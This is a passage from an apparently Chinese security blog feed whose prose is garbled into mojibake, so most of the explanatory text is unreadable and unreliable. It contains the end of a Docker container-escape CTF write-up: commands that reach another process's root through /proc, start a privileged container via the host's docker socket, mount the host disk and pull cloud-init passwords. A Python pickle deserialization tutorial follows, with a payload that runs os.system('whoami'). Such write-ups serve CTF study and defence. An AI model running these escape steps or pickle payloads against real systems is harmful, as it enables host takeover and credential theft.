<p>ç„¶ååœ¨å®¹å™¨ä¸­åˆ›å»ºä¸€ä¸ª UID å’Œ GID ä¸ç›®æ ‡è¿›ç¨‹ UID å’Œ GID ç›¸åŒçš„ç”¨æˆ·<br>è¿™é‡Œçš„uidå¾ˆæ˜æ˜¾æ˜¯1000ï¼Œgidåˆ™éœ€è¦çŒœæµ‹ï¼ˆåŸºæœ¬ä»1000å¼€å§‹ï¼Œè¿™ä¸€é¢˜ä¸­æ˜¯1001ï¼‰</p>
<p><img src="/img/docker/docker-e-3.png"></p>
<p>æœ€åç”¨ su å‘½ä»¤åˆ‡æ¢åˆ°è¯¥ç”¨æˆ·ï¼Œå°±æœ‰æƒé™è®¿é—®ç›®æ ‡è¿›ç¨‹çš„ &#x2F;proc&#x2F;[pid]&#x2F;root äº†</p>
<p><img src="/img/docker/docker-e-4.png"></p>
<p>éé¢„æœŸè§£æ³•</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> fd <span class="hljs-keyword">in</span> `find /proc/*/root`; <span class="hljs-keyword">do</span> <span class="hljs-built_in">ls</span> -al <span class="hljs-variable">$fd</span> | grep \&gt;; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>



<h2 id="Be-a-Cloud-Hacker"><a href="#Be-a-Cloud-Hacker" class="headerlink" title="Be-a-Cloud-Hacker"></a>Be-a-Cloud-Hacker</h2><p>å…ˆæå‡æƒé™</p>
<p>åˆ›å»ºç‰¹æƒå®¹å™¨</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">apt update<br>apt install docker.io<br># cat /proc/$pid/root/etc/groupå¾—åˆ°gidä¸º1000ï¼Œå°†åŸæ¥çš„æ›¿æ¢æˆ1000<br>sed -i &#x27;s/docker:x:103:/docker:x:1000:/g&#x27; /etc/group<br>usermod -aG docker exp<br><br>su exp<br>pid=$(pidof sleep)<br>docker -H unix:///proc/$pid/root/run/docker.sock run -it --privileged ubuntu bash<br></code></pre></td></tr></table></figure>

<p>åœ¨ç‰¹æƒå®¹å™¨ä¸­é€ƒé€¸</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">mkdir /tmp/m<br>mount /dev/sda1 /tmp/m<br></code></pre></td></tr></table></figure>

<p>æœ€åæ‰¾cloud-initçš„é…ç½®æ–‡ä»¶ä¸­çš„å¯†ç å°±è¡Œäº†ï¼ˆé»˜è®¤åœ¨&#x2F;var&#x2F;lib&#x2F;cloudï¼‰</p>
<p><img src="/img/docker/docker-e-5.png"></p>
<hr>
<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.anquanke.com/post/id/290540">ä¸€ä¸ªæœªå…¬å¼€çš„å®¹å™¨é€ƒé€¸æ–¹å¼</a></p>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>é€ƒé€¸</tag>
      </tags>
  </entry>
  <entry>
    <title>pythonååºåˆ—åŒ–</title>
    <url>/posts/ab2b72a2/</url>
    <content><![CDATA[<h1 id="pythonçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–"><a href="#pythonçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–" class="headerlink" title="pythonçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–"></a>pythonçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–</h1><p>ä¸PHPï¼ŒJavaç±»ä¼¼ï¼Œpythonçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–å°±æ˜¯å¯¹è±¡ä¸æ•°æ®çš„ç›¸äº’è½¬æ¢ï¼Œæ˜¯ä¸ºäº†è§£å†³å¯¹è±¡ä¼ è¾“ä¸æŒä¹…åŒ–å­˜å‚¨é—®é¢˜</p>
<p>åœ¨Pythonä¸­åºåˆ—åŒ–ä¸€èˆ¬é€šè¿‡pickleæ¨¡å—å’Œjsonæ¨¡å—å®ç°</p>
<p>pickleæ¨¡å—å’Œjsonæ¨¡å—æä¾›äº†dumps()ã€dump()ã€loads()ã€load()å››ä¸ªå‡½æ•°</p>
<table>
<thead>
<tr>
<th>å‡½æ•°</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>dump()</td>
<td>å¯¹è±¡ååºåˆ—åŒ–åˆ°æ–‡ä»¶å¯¹è±¡å¹¶å­˜å…¥æ–‡ä»¶</td>
</tr>
<tr>
<td>dumps()</td>
<td>å¯¹è±¡ååºåˆ—åŒ–ä¸º bytes å¯¹è±¡</td>
</tr>
<tr>
<td>load()</td>
<td>å¯¹è±¡ååºåˆ—åŒ–å¹¶ä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®</td>
</tr>
<tr>
<td>loads()</td>
<td>ä» bytes å¯¹è±¡ååºåˆ—åŒ–</td>
</tr>
</tbody></table>
<p>ä¸jsonç›¸æ¯”ï¼Œpickleä»¥äºŒè¿›åˆ¶å‚¨å­˜ï¼Œä¸æ˜“äººå·¥é˜…è¯»ï¼›jsonå¯ä»¥è·¨è¯­è¨€ï¼Œè€Œpickleæ˜¯Pythonä¸“ç”¨çš„ï¼›pickleèƒ½è¡¨ç¤ºpythonå‡ ä¹æ‰€æœ‰çš„ç±»å‹ï¼ˆåŒ…æ‹¬è‡ªå®šä¹‰ç±»å‹ï¼‰ï¼Œjsonåªèƒ½è¡¨ç¤ºä¸€éƒ¨åˆ†å†…ç½®ç±»å‹ä¸”ä¸èƒ½è¡¨ç¤ºè‡ªå®šä¹‰ç±»å‹</p>
<h1 id="PVM"><a href="#PVM" class="headerlink" title="PVM"></a>PVM</h1><blockquote>
<p>pythonåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹éƒ½æ˜¯å‘ç”Ÿåœ¨PVM(Pickle Virtual Machine)ä¸Šçš„ï¼Œå®ƒæ˜¯Pythonæ ‡å‡†åº“ä¸­çš„ä¸€éƒ¨åˆ†ï¼Œç”±Pythonçš„pickleæ¨¡å—æä¾›æ”¯æŒ</p>
</blockquote>
<p>pvmç”±æŒ‡ä»¤å¤„ç†å™¨ã€æ ˆåŒºå’Œå†…å­˜åŒºä¸‰éƒ¨åˆ†ç»„æˆ</p>
<ul>
<li><p>æŒ‡ä»¤å¤„ç†å™¨ï¼šä¹Ÿå°±æ˜¯å¼•æ“ï¼Œä»æµä¸­è¯»å–opcodeå’Œå‚æ•°, å¹¶å¯¹å…¶è¿›è¡Œè§£é‡Šå¤„ç†. é‡å¤è¿™ä¸ªåŠ¨ä½œ, ç›´åˆ°é‡åˆ°.è¿™ä¸ªç»“æŸç¬¦ååœæ­¢, æœ€ç»ˆç•™åœ¨æ ˆé¡¶çš„å€¼å°†è¢«ä½œä¸ºååºåˆ—åŒ–å¯¹è±¡è¿”å›</p>
</li>
<li><p>æ ˆåŒºï¼šç”±Pythonçš„listå®ç°, è¢«ç”¨æ¥ä¸´æ—¶å­˜å‚¨æ•°æ®ã€å‚æ•°ä»¥åŠå¯¹è±¡, åœ¨ä¸æ–­çš„è¿›å‡ºæ ˆè¿‡ç¨‹ä¸­å®Œæˆå¯¹æ•°æ®æµçš„ååºåˆ—åŒ–æ“ä½œ, å¹¶æœ€ç»ˆåœ¨æ ˆé¡¶ç”Ÿæˆååºåˆ—åŒ–çš„ç»“æœ</p>
</li>
<li><p>å†…å­˜åŒºï¼šæˆ–è€…ç§°ä¸ºæ ‡ç­¾åŒºï¼Œç”±Pythonçš„dictå®ç°, ä¸ºPVMçš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸæä¾›å­˜å‚¨ï¼ˆå°†ååºåˆ—åŒ–å®Œæˆçš„æ•°æ®ä»¥ key-value çš„å½¢å¼å‚¨å­˜åœ¨memoä¸­ï¼Œä»¥ä¾¿åæ¥ä½¿ç”¨ï¼‰</p>
</li>
</ul>
<h2 id="PVM-åè®®"><a href="#PVM-åè®®" class="headerlink" title="PVM åè®®"></a>PVM åè®®</h2><p>å› ä¸ºpythonç‰ˆæœ¬çš„ä¸åŒï¼Œæ‰€ä»¥é»˜è®¤ä½¿ç”¨çš„åè®®ä¸åŒã€‚å› ä¸ºPVMçš„æŒ‡ä»¤é›†ç”¨çš„åè®®æœ‰å¾ˆå¤§çš„å·®åˆ«ï¼Œæ‰€ä»¥ä¸åŒçš„pythonç‰ˆæœ¬åºåˆ—åŒ–å‡ºæ¥çš„æ•°æ®æ˜¯æœ‰å·®åˆ«çš„</p>
<p>å¯ä»¥é€šè¿‡<code>protocol=num</code>æ¥é€‰æ‹©opcodeçš„ç‰ˆæœ¬ï¼Œpickleåè®®æ˜¯å‘å‰å…¼å®¹çš„</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name=<span class="hljs-string">&#x27;lewiserii&#x27;</span></span>):<br>        self.name = name<br><br><br>test = Test()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] pickle v&#123;&#125;: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(i), pickle.dumps(test, protocol=i)))<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">[+] pickle v0: <span class="hljs-string">b&#x27;ccopy_reg\n_reconstructor\np0\n(c__main__\nTest\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\n(dp5\nVname\np6\nVlewiserii\np7\nsb.&#x27;</span><br>[+] pickle v1: <span class="hljs-string">b&#x27;ccopy_reg\n_reconstructor\nq\x00(c__main__\nTest\nq\x01c__builtin__\nobject\nq\x02Ntq\x03Rq\x04&#125;q\x05X\x04\x00\x00\x00nameq\x06X\t\x00\x00\x00lewiseriiq\x07sb.&#x27;</span><br>[+] pickle v2: <span class="hljs-string">b&#x27;\x80\x02c__main__\nTest\nq\x00)\x81q\x01&#125;q\x02X\x04\x00\x00\x00nameq\x03X\t\x00\x00\x00lewiseriiq\x04sb.&#x27;</span><br>[+] pickle v3: <span class="hljs-string">b&#x27;\x80\x03c__main__\nTest\nq\x00)\x81q\x01&#125;q\x02X\x04\x00\x00\x00nameq\x03X\t\x00\x00\x00lewiseriiq\x04sb.&#x27;</span><br>[+] pickle v4: <span class="hljs-string">b&#x27;\x80\x04\x95/\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04Test\x94\x93\x94)\x81\x94&#125;\x94\x8c\x04name\x94\x8c\tlewiserii\x94sb.&#x27;</span><br>[+] pickle v5: <span class="hljs-string">b&#x27;\x80\x05\x95/\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04Test\x94\x93\x94)\x81\x94&#125;\x94\x8c\x04name\x94\x8c\tlewiserii\x94sb.&#x27;</span><br></code></pre></td></tr></table></figure>

<p>ä¸åŒç‰ˆæœ¬é—´çš„åŒºåˆ«</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">v0 ç‰ˆåè®®æ˜¯åŸå§‹çš„&quot;äººç±»å¯è¯»&quot;åè®®ï¼Œå¹¶ä¸”å‘åå…¼å®¹æ—©æœŸç‰ˆæœ¬çš„ Python<br>v1 ç‰ˆåè®®æ˜¯è¾ƒæ—©çš„äºŒè¿›åˆ¶æ ¼å¼ï¼Œå®ƒä¹Ÿä¸æ—©æœŸç‰ˆæœ¬çš„ Python å…¼å®¹<br>v2 ç‰ˆåè®®æ˜¯åœ¨ Python 2.3 ä¸­åŠ å…¥çš„ï¼Œå®ƒä¸ºå­˜å‚¨ new-style class æä¾›äº†æ›´é«˜æ•ˆçš„æœºåˆ¶ï¼ˆå‚è€ƒ PEP 307ï¼‰<br>v3 ç‰ˆåè®®æ˜¯åœ¨ Python 3.0 ä¸­åŠ å…¥çš„ï¼Œå®ƒæ˜¾å¼åœ°æ”¯æŒ bytes å­—èŠ‚å¯¹è±¡ï¼Œä¸èƒ½ä½¿ç”¨ Python 2.x è§£å°ã€‚è¿™æ˜¯ Python 3.0-3.7 çš„é»˜è®¤åè®®<br>v4 ç‰ˆåè®®æ·»åŠ äº Python 3.4ã€‚å®ƒæ”¯æŒå­˜å‚¨éå¸¸å¤§çš„å¯¹è±¡ï¼Œèƒ½å­˜å‚¨æ›´å¤šç§ç±»çš„å¯¹è±¡ï¼Œè¿˜åŒ…æ‹¬ä¸€äº›é’ˆå¯¹æ•°æ®æ ¼å¼çš„ä¼˜åŒ–ï¼ˆå‚è€ƒ PEP 3154ï¼‰ã€‚å®ƒæ˜¯ Python 3.8 ä½¿ç”¨çš„é»˜è®¤åè®®<br>v5 ç‰ˆåè®®æ˜¯åœ¨ Python 3.8 ä¸­åŠ å…¥çš„ã€‚å®ƒå¢åŠ äº†å¯¹å¸¦å¤–æ•°æ®çš„æ”¯æŒï¼Œå¹¶å¯åŠ é€Ÿå¸¦å†…æ•°æ®å¤„ç†ï¼ˆå‚è€ƒ PEP 574ï¼‰<br></code></pre></td></tr></table></figure>

<h2 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h2><p>opcodeä¹Ÿå°±æ˜¯æ“ä½œç ï¼Œæ˜¯åºåˆ—åŒ–å†…å®¹çš„æ ¸å¿ƒï¼Œå¹¶ä¸” opcode æ˜¯å•å­—èŠ‚çš„</p>
<p>åœ¨<code>$PYTHON/Lib/pickle.py</code>ä¸­å¯ä»¥æŸ¥çœ‹åˆ°å®Œæ•´çš„opcode</p>
<p>ä»¥ä¸‹æ˜¯V0åè®®ä¸­ä¸€äº›å¸¸è§çš„</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">MARK           = <span class="hljs-string">b&#x27;(&#x27;</span>   <span class="hljs-comment"># å‘æ ˆä¸­å‹å…¥ä¸€ä¸ª MARK æ ‡è®°</span><br>STOP           = <span class="hljs-string">b&#x27;.&#x27;</span>   <span class="hljs-comment"># ç¨‹åºç»“æŸï¼Œæ ˆé¡¶çš„ä¸€ä¸ªå…ƒç´ ä½œä¸º pickle.loads() çš„è¿”å›å€¼</span><br>POP            = <span class="hljs-string">b&#x27;0&#x27;</span>   <span class="hljs-comment"># ä¸¢å¼ƒæ ˆé¡¶å¯¹è±¡</span><br>POP_MARK       = <span class="hljs-string">b&#x27;1&#x27;</span>   <span class="hljs-comment"># ä¸¢å¼ƒæ ˆé¡¶åˆ°æœ€é¡¶å±‚çš„æ ‡è®°å¯¹è±¡</span><br>DUP            = <span class="hljs-string">b&#x27;2&#x27;</span>   <span class="hljs-comment"># é‡å¤çš„é¡¶éƒ¨å †æ ˆé¡¹ç›®</span><br>FLOAT          = <span class="hljs-string">b&#x27;F&#x27;</span>   <span class="hljs-comment"># å®ä¾‹åŒ–ä¸€ä¸ª float å¯¹è±¡</span><br>INT            = <span class="hljs-string">b&#x27;I&#x27;</span>   <span class="hljs-comment"># å®ä¾‹åŒ–ä¸€ä¸ª int æˆ–è€… bool å¯¹è±¡</span><br>NONE           = <span class="hljs-string">b&#x27;N&#x27;</span>   <span class="hljs-comment"># æ ˆä¸­å‹å…¥ None</span><br>REDUCE         = <span class="hljs-string">b&#x27;R&#x27;</span>   <span class="hljs-comment"># ä»æ ˆä¸Šå¼¹å‡ºä¸¤ä¸ªå¯¹è±¡ï¼Œç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼ˆå¿…é¡»ä¸ºå…ƒç»„ï¼‰ï¼Œç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°ï¼Œç„¶åè°ƒç”¨è¯¥å‡½æ•°å¹¶æŠŠç»“æœå‹å›æ ˆ</span><br>STRING         = <span class="hljs-string">b&#x27;S&#x27;</span>   <span class="hljs-comment"># å®ä¾‹åŒ–ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡</span><br>UNICODE        = <span class="hljs-string">b&#x27;V&#x27;</span>   <span class="hljs-comment"># å®ä¾‹åŒ–ä¸€ä¸ª UNICODE å­—ç¬¦ä¸²å¯¹è±¡</span><br>APPEND         = <span class="hljs-string">b&#x27;a&#x27;</span>   <span class="hljs-comment"># å°†æ ˆçš„ç¬¬ä¸€ä¸ªå…ƒç´  append åˆ°ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨ï¼‰ä¸­</span><br>BUILD          = <span class="hljs-string">b&#x27;b&#x27;</span>   <span class="hljs-comment"># ä½¿ç”¨æ ˆä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆå‚¨å­˜å¤šä¸ª å±æ€§å-å±æ€§å€¼ çš„å­—å…¸ï¼‰å¯¹ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆå¯¹è±¡å®ä¾‹ï¼‰è¿›è¡Œå±æ€§è®¾ç½®ï¼Œè°ƒç”¨ __setstate__ æˆ– __dict__.update()</span><br>GLOBAL         = <span class="hljs-string">b&#x27;c&#x27;</span>   <span class="hljs-comment"># è·å–ä¸€ä¸ªå…¨å±€å¯¹è±¡æˆ– import ä¸€ä¸ªæ¨¡å—ï¼ˆä¼šè°ƒç”¨ import è¯­å¥ï¼Œèƒ½å¤Ÿå¼•å…¥æ–°çš„åŒ…ï¼‰ï¼Œå‹å…¥æ ˆ</span><br>DICT           = <span class="hljs-string">b&#x27;d&#x27;</span>   <span class="hljs-comment"># å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ª MARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå­—å…¸ï¼ˆæ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ªï¼Œå³å‘ˆ key-value å¯¹ï¼‰ï¼Œå¼¹å‡ºç»„åˆï¼Œå¼¹å‡º MARKï¼Œå‹å›ç»“æœ</span><br>EMPTY_DICT     = <span class="hljs-string">b&#x27;&#125;&#x27;</span>   <span class="hljs-comment"># å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºå­—å…¸</span><br>APPENDS        = <span class="hljs-string">b&#x27;e&#x27;</span>   <span class="hljs-comment"># å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ª MARKï¼Œç»„åˆä¹‹é—´çš„æ•°æ®å¹¶ extends åˆ°è¯¥ MARK ä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨ï¼‰ä¸­</span><br>GET            = <span class="hljs-string">b&#x27;g&#x27;</span>   <span class="hljs-comment"># å°† memo[n] çš„å‹å…¥æ ˆ</span><br>INST           = <span class="hljs-string">b&#x27;i&#x27;</span>   <span class="hljs-comment"># ç›¸å½“äº c å’Œ o çš„ç»„åˆï¼Œå…ˆè·å–ä¸€ä¸ªå…¨å±€å‡½æ•°ï¼Œç„¶åä»æ ˆé¡¶å¼€å§‹å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ª MARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„ï¼Œä»¥è¯¥å…ƒç»„ä¸ºå‚æ•°æ‰§è¡Œå…¨å±€å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰</span><br>LIST           = <span class="hljs-string">b&#x27;l&#x27;</span>   <span class="hljs-comment"># ä»æ ˆé¡¶å¼€å§‹å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ª MARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºåˆ—è¡¨</span><br>EMPTY_LIST     = <span class="hljs-string">b&#x27;]&#x27;</span>   <span class="hljs-comment"># å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºåˆ—è¡¨</span><br>OBJ            = <span class="hljs-string">b&#x27;o&#x27;</span>   <span class="hljs-comment"># ä»æ ˆé¡¶å¼€å§‹å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ª MARKï¼Œä»¥ä¹‹é—´çš„ç¬¬ä¸€ä¸ªæ•°æ®ï¼ˆå¿…é¡»ä¸ºå‡½æ•°ï¼‰ä¸º callableï¼Œç¬¬äºŒä¸ªåˆ°ç¬¬ n ä¸ªæ•°æ®ä¸ºå‚æ•°ï¼Œæ‰§è¡Œè¯¥å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰ï¼Œå¼¹å‡º MARKï¼Œå‹å›ç»“æœï¼Œ</span><br>PUT            = <span class="hljs-string">b&#x27;p&#x27;</span>   <span class="hljs-comment"># å°†æ ˆé¡¶å¯¹è±¡å‚¨å­˜è‡³ memo[n]</span><br>SETITEM        = <span class="hljs-string">b&#x27;s&#x27;</span>   <span class="hljs-comment"># å°†æ ˆçš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸º valueï¼Œç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸º keyï¼Œæ·»åŠ æˆ–æ›´æ–°åˆ°æ ˆçš„ç¬¬ä¸‰ä¸ªå¯¹è±¡ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨æˆ–å­—å…¸ï¼Œåˆ—è¡¨ä»¥æ•°å­—ä½œä¸º keyï¼‰ä¸­</span><br>TUPLE          = <span class="hljs-string">b&#x27;t&#x27;</span>   <span class="hljs-comment"># å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ª MARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„ï¼Œå¼¹å‡ºç»„åˆï¼Œå¼¹å‡º MARKï¼Œå‹å›ç»“æœ</span><br>EMPTY_TUPLE    = <span class="hljs-string">b&#x27;)&#x27;</span>   <span class="hljs-comment"># å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºå…ƒç»„</span><br>SETITEMS       = <span class="hljs-string">b&#x27;u&#x27;</span>   <span class="hljs-comment"># å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ª MARKï¼Œç»„åˆä¹‹é—´çš„æ•°æ®ï¼ˆæ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ªï¼Œå³å‘ˆ key-value å¯¹ï¼‰å¹¶å…¨éƒ¨æ·»åŠ æˆ–æ›´æ–°åˆ°è¯¥ MARK ä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºå­—å…¸ï¼‰ä¸­</span><br></code></pre></td></tr></table></figure>


<h2 id="å¤„ç†åºåˆ—åŒ–å­—èŠ‚æµçš„è¿‡ç¨‹"><a href="#å¤„ç†åºåˆ—åŒ–å­—èŠ‚æµçš„è¿‡ç¨‹" class="headerlink" title="å¤„ç†åºåˆ—åŒ–å­—èŠ‚æµçš„è¿‡ç¨‹ "></a>å¤„ç†åºåˆ—åŒ–å­—èŠ‚æµçš„è¿‡ç¨‹ <a id="a"></h2><p>è¿™é‡Œç”¨ä¸€æ®µç®€çŸ­çš„å­—èŠ‚ç æ¥æ¼”ç¤ºåˆ©ç”¨è¿‡ç¨‹:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">cos<br>system<br>(S<span class="hljs-string">&#x27;whoami&#x27;</span><br>tR.<br></code></pre></td></tr></table></figure>

<p>æŒ‰ç…§pickle.pyä¸­çš„æºç åˆ†æå¤„ç†åºåˆ—åŒ–å­—èŠ‚æµçš„è¿‡ç¨‹</p>
<p><strong>c</strong></p>
<p>è·å–ä¸€ä¸ªå…¨å±€å¯¹è±¡æˆ– import ä¸€ä¸ªæ¨¡å—ï¼ˆä¼šè°ƒç”¨ import è¯­å¥ï¼Œèƒ½å¤Ÿå¼•å…¥æ–°çš„åŒ…ï¼‰ï¼Œå‹å…¥æ ˆ</p>
<p>æºä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_global</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># è¯»å–ä¸€è¡Œæ•°æ®ï¼Œå»æ‰æ¢è¡Œç¬¦ï¼Œä½œä¸ºæ¨¡å—åï¼Œä¾‹å­ä¸­æ˜¯os</span><br>    module = self.readline()[:-<span class="hljs-number">1</span>].decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    <span class="hljs-comment"># è¯»å–ä¸‹ä¸€è¡Œæ•°æ®ï¼Œä½œä¸ºç±»åï¼Œä¾‹å­ä¸­æ˜¯system</span><br>    name = self.readline()[:-<span class="hljs-number">1</span>].decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    <span class="hljs-comment"># è°ƒç”¨find_class</span><br>    klass = self.find_class(module, name)<br>    <span class="hljs-comment"># è·å–æ¨¡å—åæ·»åŠ åˆ°å½“å‰æ ˆä¸­</span><br>    self.append(klass)<br>dispatch[GLOBAL[<span class="hljs-number">0</span>]] = load_global<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>    <span class="hljs-comment"># Subclasses may override this.</span><br>    <span class="hljs-comment"># åœ¨ç³»ç»Ÿå®¡è®¡åŠŸèƒ½è®°å½•pickle.find_classäº‹ä»¶ï¼Œé™„å¸¦å‚æ•°moduleå’Œname</span><br>    sys.audit(<span class="hljs-string">&#x27;pickle.find_class&#x27;</span>, module, name)<br><br>    <span class="hljs-comment"># å¦‚æœåè®®ç‰ˆæœ¬å°äº3ä¸”å¼€å¯äº†fix_importsæ ‡å¿—ï¼Œåˆ™è¿›è¡Œç‰¹æ®Šçš„åç§°å’Œæ¨¡å—æ˜ å°„å¤„ç†</span><br>    <span class="hljs-keyword">if</span> self.proto &lt; <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> self.fix_imports:<br>        <span class="hljs-comment"># å¦‚æœ(module, name)åœ¨NAME_MAPPINGä¸­ï¼Œåˆ™ä½¿ç”¨æ˜ å°„çš„åç§°ä»£æ›¿åŸåç§°</span><br>        <span class="hljs-keyword">if</span> (module, name) <span class="hljs-keyword">in</span> _compat_pickle.NAME_MAPPING:<br>            module, name = _compat_pickle.NAME_MAPPING[(module, name)]<br>        <span class="hljs-comment"># å¦‚æœmoduleåœ¨IMPORT_MAPPINGä¸­ï¼Œåˆ™ä½¿ç”¨æ˜ å°„çš„æ¨¡å—åä»£æ›¿åŸæ¨¡å—å</span><br>        <span class="hljs-keyword">elif</span> module <span class="hljs-keyword">in</span> _compat_pickle.IMPORT_MAPPING:<br>            module = _compat_pickle.IMPORT_MAPPING[module]<br><br>    <span class="hljs-comment"># åŠ¨æ€åŠ è½½æŒ‡å®šæ¨¡å—</span><br>    <span class="hljs-built_in">__import__</span>(module, level=<span class="hljs-number">0</span>)<br>    <span class="hljs-comment"># å¦‚æœåè®®ç‰ˆæœ¬å¤§äº4åˆ™ä½¿ç”¨_getattributeæ–¹æ³•è·å–å¯¹è±¡</span><br>    <span class="hljs-keyword">if</span> self.proto &gt;= <span class="hljs-number">4</span>:<br>        <span class="hljs-keyword">return</span> _getattribute(sys.modules[module], name)[<span class="hljs-number">0</span>]<br>    <span class="hljs-comment"># å¦åˆ™ä½¿ç”¨getattræ–¹æ³•è·å–å¯¹è±¡</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(sys.modules[module], name)<br><br><span class="hljs-comment"># ä¸getattrç±»ä¼¼</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_getattribute</span>(<span class="hljs-params">obj, name</span>):<br>    <span class="hljs-comment"># å°†å±æ€§åæŒ‰ç…§ç‚¹å·ï¼ˆ.ï¼‰è¿›è¡Œåˆ†å‰²</span><br>    <span class="hljs-keyword">for</span> subpath <span class="hljs-keyword">in</span> name.split(<span class="hljs-string">&#x27;.&#x27;</span>):<br>        <span class="hljs-keyword">if</span> subpath == <span class="hljs-string">&#x27;&lt;locals&gt;&#x27;</span>:<br>            <span class="hljs-keyword">raise</span> AttributeError(<span class="hljs-string">&quot;Can&#x27;t get local attribute &#123;!r&#125; on &#123;!r&#125;&quot;</span><br>                                 .<span class="hljs-built_in">format</span>(name, obj))<br>        <span class="hljs-keyword">try</span>:<br>            parent = obj<br>            obj = <span class="hljs-built_in">getattr</span>(obj, subpath)<br>        <span class="hljs-keyword">except</span> AttributeError:<br>            <span class="hljs-keyword">raise</span> AttributeError(<span class="hljs-string">&quot;Can&#x27;t get attribute &#123;!r&#125; on &#123;!r&#125;&quot;</span><br>                                 .<span class="hljs-built_in">format</span>(name, obj)) <span class="hljs-keyword">from</span> <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">return</span> obj, parent<br></code></pre></td></tr></table></figure>

<p><strong>(</strong></p>
<p>å‘æ ˆä¸­å‹å…¥ä¸€ä¸ª MARK æ ‡è®°</p>
<p>æºä»£ç ï¼š</p>
